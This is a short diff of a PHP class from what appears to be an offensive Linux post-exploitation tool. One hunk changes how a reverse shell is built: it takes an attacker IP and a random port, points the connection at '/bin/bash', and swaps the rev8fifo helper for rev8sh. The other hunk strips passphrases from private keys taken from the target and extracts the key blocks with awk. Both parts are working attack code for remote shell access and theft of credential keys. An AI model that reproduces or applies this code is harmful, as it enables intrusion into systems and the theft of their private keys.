@@ -496,7 +496,7 @@ class check4linux8key extends check4linux8enum{
             $attacker_ip = $this->ip4addr4target($this->ip);
             $attacker_port = rand(1024,65535);
             $shell = "/bin/bash";
-            $cmd_rev  = $this->rev8fifo($attacker_ip, $attacker_port, $shell);
+            $cmd_rev  = $this->rev8sh($attacker_ip, $attacker_port, $shell);
             $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
 
             $lprotocol = 'T' ;
@@ -565,7 +565,7 @@ class check4linux8key extends check4linux8enum{
             if (!empty($privkey_passwd)) $private_keys_str = $this->key8priv4pass2nopass("", $private_keys_str8tmp, $privkey_passwd,$type_crypt);
         }
         if (!empty($private_keys_str)) return $this->req_ret_str("echo '$private_keys_str'  | awk '/BEGIN PRIVATE KEY/,/END PRIVATE KEY/' "); //| awk '/BEGIN $type_crypt PRIVATE KEY/,/END $type_crypt PRIVATE KEY/' 
-        else return $result;
+        else return $privkey_str;
     }
     
     
